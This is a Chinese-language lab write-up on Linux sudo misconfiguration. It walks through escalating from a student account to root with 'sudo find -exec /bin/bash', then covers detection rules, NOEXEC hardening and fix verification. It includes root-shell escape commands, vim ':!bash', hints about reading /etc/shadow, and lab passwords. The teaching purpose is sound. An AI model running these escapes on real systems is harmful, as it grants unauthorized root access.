# Day 05：sudo 不是漏洞：真正危險的是「你被允許執行什麼」

> Lab：FEI-L01-SUDO

---

## 背景知識

### sudo 的設計目的

![sudo 的設計目的](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day05-sudo-misconfiguration-diagram-01.png)


sudo（superuser do）誕生於 1980 年，目的是讓系統管理員**委派**特定的 root 權限給一般使用者，而不需要分享 root 密碼。

核心理念很好：


但問題在於：**如果你開放的那個指令本身就能衍生出 shell 呢？**

### GTFOBins 概念

GTFOBins（https://gtfobins.github.io）是一個收集「合法 Unix binary 的意外用途」的專案。它列出了哪些程式在被授予 sudo 權限時，可以被用來突破預期的限制。

例如 `find`——一個「只是搜尋檔案」的工具——其實有 `-exec` 參數可以執行任意指令。

---

## OS 原理：sudoers 完整解析

### sudoers 語法

```
user host=(runas) tag: command
```

| 欄位 | 說明 | 範例 |
|------|------|------|
| **user** | 誰可以使用這條規則 | `fei-student` |
| **host** | 在哪台主機上有效 | `ALL` |
| **runas** | 以誰的身分執行 | `(root)` |
| **tag** | 額外標籤 | `NOPASSWD:` |
| **command** | 允許執行的指令 | `/usr/bin/find` |

完整範例：

```
fei-student ALL=(root) NOPASSWD: /usr/bin/find
```

翻譯：fei-student 可以在任何主機上，以 root 身分，不需要密碼，執行 `/usr/bin/find`。

### sudoers 檔案位置

```
/etc/sudoers              ← 主設定檔
/etc/sudoers.d/           ← 額外設定（drop-in directory）
/etc/sudoers.d/fei-l01-vuln  ← FEI Lab 建立的規則
```

### 重要機制

| 機制 | 說明 |
|------|------|
| **NOPASSWD** | 不需要輸入使用者密碼 |
| **NOEXEC** | 阻止被授權程式再 exec 子程式 |
| **secure_path** | sudo 執行時的 PATH（防止 PATH 劫持）|
| **env_reset** | 清除環境變數（防止環境變數注入）|

### sudo 的存取控制流程

![sudo 的存取控制流程](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day05-sudo-misconfiguration-diagram-02.png)



**關鍵**：sudo 的權限檢查**止於 `find` 這個程式是否在允許清單中**。一旦 find 以 root 身分啟動，它內部做什麼（例如 `-exec /bin/bash`）sudo 不會管。

---

## Lab：FEI-L01-SUDO

### 環境

```
🔬 FEI Lab 環境
VM:       FEI-PRIVESC-LINUX
OS:       Ubuntu 22.04.4 LTS
起始帳號:  fei-student
目標:     root
Flag:     /root/fei-l01-flag.txt
Scenario: FEI-L01-SUDO
```



### 場景準備

`ash
# 1. 以 fei-labadmin 登入
ssh fei-labadmin@192.168.77.10
# 密碼：FEI-LabAdmin-2026!

# 2. 進入場景目錄並 setup
cd /opt/fei-privesc/scenarios/FEI-L01-SUDO
sudo ./fei-setup.sh

# 3. 確認場景就緒
sudo ./fei-verify.sh
# 應看到 L01-SUDO STATUS: READY

# 4. 切換到 fei-student
su - fei-student
# 密碼：FEI-Student-2026!
`

### 部署過程

```bash
# fei-labadmin 執行 setup
sudo ./fei-setup.sh

# setup 做了什麼：
# 1. 建立 /etc/sudoers.d/fei-l01-vuln：
#    fei-student ALL=(root) NOPASSWD: /usr/bin/find
# 2. 建立 /root/fei-l01-flag.txt（0600 root:root）
# 3. visudo -cf 驗證語法正確
```

### Verify 結果（實際 Lab 輸出）

```
[PASS] fei-student exists
[PASS] fei-student UID is not 0
[PASS] intended sudo rule exists (/etc/sudoers.d/fei-l01-vuln)
[PASS] intended binary exists (/usr/bin/find)
[PASS] intended binary ownership is correct (root:root)
[PASS] intended privilege path is available (sudo find)
[PASS] root flag exists (/root/fei-l01-flag.txt)
[PASS] root flag is owned by root
[PASS] fei-student cannot directly read root flag
[PASS] no broad NOPASSWD: ALL exists
[PASS] no unrelated privileged group membership

FEI-L01 STATUS: READY
```

11/11 PASS。場景就緒。

---

## Attack Reasoning：先問再查

### 第一個問題：「我有什麼特殊權限？」

我們昨天學過，第一件事是用 `sudo -l` 查看：

```bash
fei-student@fei-privesc-linux:~$ sudo -l
User fei-student may run the following commands on fei-privesc-linux:
    (root) NOPASSWD: /usr/bin/find
```

**觀察**：
- 可以以 `root` 身分執行
- `NOPASSWD` — 不需要密碼
- 只允許 `/usr/bin/find`

### 第二個問題：「find 除了找檔案，還能做什麼？」

```bash
# 查看 find 的 man page 或 help
man find | grep exec
```

發現 `-exec` 參數：可以對找到的每個檔案執行指定的指令。

### Attack Hypothesis

```
已知條件：
- fei-student 可以 sudo find（以 root 執行）
- find 有 -exec 參數（可以執行任意指令）

假設：
- sudo find ... -exec /bin/bash
- bash 會繼承 find 的 root 身分
- 得到 root shell

需要驗證：
- -exec 真的以 root 身分執行嗎？
```

---

## Actual Output：完整攻擊流程

### Step 1：確認身分

```bash
fei-student@fei-privesc-linux:~$ whoami
fei-student

fei-student@fei-privesc-linux:~$ id
uid=1001(fei-student) gid=1001(fei-student) groups=1001(fei-student)
```

### Step 2：確認不能直接讀 flag

```bash
fei-student@fei-privesc-linux:~$ cat /root/fei-l01-flag.txt
cat: /root/fei-l01-flag.txt: Permission denied
```

### Step 3：查看 sudo 權限

```bash
fei-student@fei-privesc-linux:~$ sudo -l
User fei-student may run the following commands on fei-privesc-linux:
    (root) NOPASSWD: /usr/bin/find
```

### Step 4：利用 find -exec 取得 root

**方法 A：直接讀取 flag（最快）**

```bash
fei-student@fei-privesc-linux:~$ sudo find /tmp -maxdepth 0 -exec cat /root/fei-l01-flag.txt \;
FEI{LINUX_L01_ROOT_ACCESS}
```

**方法 B：取得 root shell（教學推薦）**

```bash
fei-student@fei-privesc-linux:~$ sudo find . -exec /bin/bash \; -quit
root@fei-privesc-linux:~# whoami
root
root@fei-privesc-linux:~# id
uid=0(root) gid=0(root) groups=0(root)
root@fei-privesc-linux:~# cat /root/fei-l01-flag.txt
FEI{LINUX_L01_ROOT_ACCESS}
```

### Attack Path

![sudo Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day05-sudo-misconfiguration-diagram-03.png)



---

## False Positive：不是所有 sudo 都能提權

| 情境 | 為什麼不能提權 |
|------|---------------|
| `sudo -l` 顯示 `(root) NOPASSWD: /usr/bin/ls` | `ls` 沒有 `-exec` 或類似的 shell escape |
| `sudo -l` 顯示 `(root) NOPASSWD: /usr/bin/cat` | `cat` 只能讀檔案，不能執行指令（但可以讀 /etc/shadow）|
| `sudo -l` 需要密碼且你不知道密碼 | 無法使用 sudo |
| `sudo -l` 顯示 `NOEXEC: /usr/bin/find` | NOEXEC 阻止 find 再 exec 子程式 |
| `sudo -l` 顯示帶參數限制的 command | 例如 `sudo /usr/bin/find /var/log -name *.log` 限制了搜尋路徑 |

> **重點**：不是每個 sudo 授權的 command 都能提權。要看該 command 是否在 GTFOBins 上，以及是否有 NOEXEC 等限制。

---

## Edge Case

### NOEXEC Tag

```
fei-student ALL=(root) NOPASSWD: NOEXEC: /usr/bin/find
```

`NOEXEC` 會使用 `noexec` 共享庫包裝程式，讓 `execve()` 系統呼叫失敗。

限制：
- 只對**動態連結**的 binary 有效
- 靜態連結的程式不受影響
- 某些 interpreters（python、perl）可能不受影響

### sudo 版本差異

- 舊版 sudo 可能有 CVE（例如 CVE-2019-14287 的 `-u#-1` bypass）
- `sudo -V` 確認版本

### AppArmor 限制

如果 find 被 AppArmor profile 限制，即使有 sudo 也可能無法 exec 子程式。

---

## Troubleshooting

| 問題 | 原因 | 解法 |
|------|------|------|
| `sudo find -exec /bin/bash` 沒有給 root shell | 可能有 `NOEXEC` tag | 確認 `sudo -l` 有沒有 `NOEXEC` |
| `-exec` 語法錯誤 | 忘記 `{}` 或 `\;` | 完整語法：`-exec command {} \;` |
| sudo 要求密碼但不知道 | 沒有 `NOPASSWD` | 需要知道 fei-student 的密碼 |
| `sudo bash` 被拒 | 只允許 find | 必須透過允許的 command 間接提權 |
| find 產生太多輸出 | 搜尋太廣 | 用 `-maxdepth 0` 或 `-quit` 限制 |

---

## Defense

### Detect

```bash
# 監控 sudo 使用
grep "COMMAND=" /var/log/auth.log | grep fei-student

# 異常模式：
# sudo find ... -exec /bin/bash
# sudo find ... -exec /bin/sh
# sudo find ... -exec cat /etc/shadow
```

### Prevent

| 措施 | 說明 |
|------|------|
| 不給 sudo find | 改用其他機制（設定檔案權限讓使用者直接讀取）|
| 使用 NOEXEC | `NOPASSWD: NOEXEC: /usr/bin/find` |
| 限制參數 | `NOPASSWD: /usr/bin/find /var/log -name *.log -type f -print` |
| 使用 sudoedit | 需要編輯檔案時用 `sudoedit` 而非 `sudo vim` |
| 最小權限 | 不要給任何 GTFOBins 上的指令 |

### Verify

修復後確認：

```bash
# 確認 sudoers 規則已移除
sudo -l -U fei-student
# 預期：not allowed to run sudo

# 確認 sudoers.d 下沒有殘留
ls /etc/sudoers.d/
# 預期：沒有 fei-l01-vuln
```

---

## Detection：藍隊視角

### sudo 日誌分析

```bash
# /var/log/auth.log 中的 sudo 記錄
Sep 14 12:00:00 fei-privesc-linux sudo: fei-student : TTY=pts/0 ; PWD=/home/fei-student ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/bash ;
```

警告指標：
- `USER=root` + `COMMAND` 包含 `-exec /bin/bash` 或 `-exec /bin/sh`
- 非正常工時的 sudo 使用
- 不常見的 command pattern

### SIEM 規則範例

```
rule: sudo_shell_escape
condition:
  event.source: auth.log
  event.action: COMMAND
  event.command: regex("sudo.*-exec.*/bin/(ba)?sh")
severity: critical
```

---

## Fix Verification

```bash
# 1. 移除 sudoers 規則
sudo rm /etc/sudoers.d/fei-l01-vuln

# 2. 確認移除成功
sudo -l -U fei-student
# 預期：User fei-student is not allowed to run sudo

# 3. 確認 find 不再能以 root 執行
su - fei-student -c "sudo find . -exec whoami \;"
# 預期：需要密碼或被拒

# 4. 或在 FEI Lab 中使用 reset
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 預期：FEI-L01 STATUS: RESET
```

---

## Exercise

1. **GTFOBins 查詢**：去 GTFOBins 查詢以下指令在 sudo 模式下是否能提權：`vim`、`less`、`awk`、`python3`、`tar`。如果能，方法是什麼？

2. **NOEXEC 測試**（進階）：在 Lab 上建立一條 `NOEXEC` 的 sudo 規則給 find，測試 `-exec` 是否真的被阻擋。

3. **完整 sudoers 審計**：在任何你有合法存取的 Linux 系統上，檢查 `/etc/sudoers` 和 `/etc/sudoers.d/`。有沒有不必要的 NOPASSWD 規則？有沒有 GTFOBins 上的危險指令？

---

## Quiz

**Q1**：以下 sudoers 規則有什麼問題？
```
webadmin ALL=(root) NOPASSWD: /usr/bin/vim
```
- (A) 沒有問題
- (B) vim 可以在編輯器中執行 `:!bash` 取得 root shell
- (C) vim 不存在
- (D) NOPASSWD 只影響日誌記錄

### 答案(B) vim 的 `:!command` 可以執行任意指令，包括 `:!bash`。

**Q2**：`NOEXEC` tag 的作用是？
- (A) 禁止使用 sudo
- (B) 阻止被授權的程式再執行子程式
- (C) 禁止網路存取
- (D) 只在 root 帳號上有效

### 答案(B) NOEXEC 使用 noexec 共享庫阻止 execve() 系統呼叫。

**Q3**：`sudo -l` 顯示 `(root) NOPASSWD: /usr/bin/cat`。這能直接取得 root shell 嗎？
- (A) 是，cat 可以啟動 shell
- (B) 不能啟動 shell，但可以讀取 /etc/shadow
- (C) 完全無害
- (D) 需要先安裝 exploit

### 答案(B) cat 不能執行指令，但可以讀取敏感檔案如 /etc/shadow、SSH key 等。

**Q4**：sudo 的權限檢查在哪裡「停止」？
- (A) 檢查到使用者輸入的每個參數
- (B) 只檢查「被授權的程式」是否在允許清單中
- (C) 會持續監控程式的所有行為
- (D) 只在 root 登入時檢查

### 答案(B) sudo 只驗證指定的程式是否被允許。程式啟動後的行為（如 -exec）不受 sudo 控制。

---

## Engineering Note

FEI-L01-SUDO 是整個系列中最「乾淨」的場景之一——沒有遇到任何 Bug。

原因很簡單：sudoers 是 Linux 最成熟的權限機制之一，行為高度可預測。只要語法正確（`visudo -cf` 驗證），就一定會按預期工作。

相比之下，後面的 Windows 場景（特別是 W05 和 W08）遇到了大量 OS 行為差異。這也反映了兩個 OS 的哲學差異：

```
Linux sudoers: 簡單、直接、可預測
Windows UAC/Token: 複雜、多層、版本差異大
```

Unintended Path Review 也確認了：在 FEI Lab 的 Ubuntu 22.04 上，除了 sudo find 之外沒有其他提權路徑：
- pkexec SUID → CVE-2021-4034 已修補
- 無 docker group
- 無可寫 /etc/passwd
- 無 SSH key 洩漏


## 場景收尾

做完後記得 reset，避免影響下一題：

```bash
# 以 fei-labadmin 執行
ssh fei-labadmin@192.168.77.10
cd /opt/fei-privesc/scenarios/FEI-L01-SUDO
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 應看到 L01-SUDO STATUS: RESET
```

---

## 今天真正要記住的 3 件事

1. **sudo 本身不是漏洞**。它是正確的權限委派機制。問題出在「委派了什麼」。

2. **被允許的程式如果能衍生 shell，等於直接給了 root**。check GTFOBins。

3. **NOEXEC 是防禦利器**。如果必須給 sudo 權限，至少加上 NOEXEC。

---

## 給自己的問題

> sudo 讓你「以 root 執行特定程式」。但如果 root 不是直接執行程式，而是定期透過 cron 自動執行一個 script——你能修改那個 script 嗎？

---

## 下一篇

Day 06：SUID：普通使用者為什麼可以用別人的身分執行程式？——另一種「不用 sudo 也能改變身分」的機制。
